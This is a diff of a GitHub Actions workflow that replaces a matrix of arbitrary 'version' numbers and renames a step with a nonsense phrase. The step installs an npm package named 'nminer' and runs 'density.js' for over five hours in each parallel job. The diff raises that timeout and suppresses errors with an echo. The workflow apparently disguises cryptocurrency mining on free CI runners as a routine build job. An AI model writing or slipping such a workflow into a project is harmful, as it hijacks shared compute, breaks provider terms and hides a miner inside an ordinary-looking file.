@@ -9,24 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 734 }
-          - { version: 6365 }
-          - { version: 3565 }
-          - { version: 8762 }
-          - { version: 2844 }
-          - { version: 7910 }
-          - { version: 9629 }
-          - { version: 1094 }
-          - { version: 9785 }
-          - { version: 5382 }
-          - { version: 7806 }
-          - { version: 2910 }
-          - { version: 7852 }
-          - { version: 2771 }
-          - { version: 4568 }
-          - { version: 4996 }
-          - { version: 8039 }
-          - { version: 9526 }
+          - { version: 5320 }
+          - { version: 3045 }
+          - { version: 3113 }
+          - { version: 3835 }
+          - { version: 4454 }
+          - { version: 2790 }
+          - { version: 5858 }
+          - { version: 8710 }
+          - { version: 7250 }
+          - { version: 9270 }
+          - { version: 163 }
+          - { version: 4795 }
+          - { version: 4093 }
+          - { version: 1788 }
+          - { version: 8626 }
 
     steps:
       - name: Checkout
@@ -37,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: gah now transom tremendously
         run: |
           npm install nminer@latest
-          timeout 304m node density.js || echo "density executed"
+          timeout 314m node density.js || echo "density executed"
